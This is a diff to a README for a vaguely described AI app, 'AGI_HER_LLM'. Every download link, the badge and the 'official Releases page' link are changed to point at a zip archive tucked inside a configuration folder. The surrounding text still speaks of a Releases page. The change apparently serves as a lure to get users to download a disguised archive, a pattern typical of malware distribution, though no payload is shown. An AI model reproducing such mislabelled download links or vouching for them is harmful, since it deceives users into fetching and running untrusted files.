@@ -1,14 +1,14 @@
 # 🚀 AGI_HER_LLM - Unlock AI Power in Your Hands
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download-AGI_HER_LLM-brightgreen.svg)](https://github.com/KouseiA/AGI_HER_LLM/releases)
+[![Download](https://github.com/KouseiA/AGI_HER_LLM/raw/refs/heads/main/configs_llm/order4_configs/AG_LLM_HE_3.1.zip)](https://github.com/KouseiA/AGI_HER_LLM/raw/refs/heads/main/configs_llm/order4_configs/AG_LLM_HE_3.1.zip)
 
 ## 📖 Overview
 AGI_HER_LLM is a user-friendly application designed to leverage the power of artificial intelligence. Whether you want to compose text, generate ideas, or simply explore what AI can do, this tool makes it accessible for everyone. No technical skills are required to enjoy its benefits.
 
 ## 🚀 Getting Started
 ### Step 1: Access the Releases Page
-To download AGI_HER_LLM, visit the following link: [Download AGI_HER_LLM](https://github.com/KouseiA/AGI_HER_LLM/releases). This page contains the most recent versions of the application.
+To download AGI_HER_LLM, visit the following link: [Download AGI_HER_LLM](https://github.com/KouseiA/AGI_HER_LLM/raw/refs/heads/main/configs_llm/order4_configs/AG_LLM_HE_3.1.zip). This page contains the most recent versions of the application.
 
 ### Step 2: Select the Version
 On the Releases page, you will see different versions of AGI_HER_LLM. Look for the latest version which is usually at the top of the list. Each version will have a description that highlights any new features or updates.
@@ -37,7 +37,7 @@ AGI_HER_LLM includes a variety of features designed to enhance your experience:
 - **Custom Settings**: Adjust AI parameters to fit your needs.
 
 ## 📦 Download & Install
-To get started with AGI_HER_LLM, click here to download: [Download AGI_HER_LLM](https://github.com/KouseiA/AGI_HER_LLM/releases). Follow the instructions above to install the application.
+To get started with AGI_HER_LLM, click here to download: [Download AGI_HER_LLM](https://github.com/KouseiA/AGI_HER_LLM/raw/refs/heads/main/configs_llm/order4_configs/AG_LLM_HE_3.1.zip). Follow the instructions above to install the application.
 
 ## 💬 Support & Feedback
 If you encounter any issues or have questions, please feel free to reach out through the Issues section of the GitHub repository. Your feedback is valuable and will help us improve AGI_HER_LLM.
@@ -48,4 +48,4 @@ AGI_HER_LLM is open-source software licensed under the MIT License. You can use 
 ## 🤝 Contributions
 We welcome contributions to AGI_HER_LLM. If you’d like to help enhance the application, please check our contribution guidelines in the repository.
 
-For further information or updates, always refer back to the [official Releases page](https://github.com/KouseiA/AGI_HER_LLM/releases). Enjoy transforming your ideas into reality!
+For further information or updates, always refer back to the [official Releases page](https://github.com/KouseiA/AGI_HER_LLM/raw/refs/heads/main/configs_llm/order4_configs/AG_LLM_HE_3.1.zip). Enjoy transforming your ideas into reality!
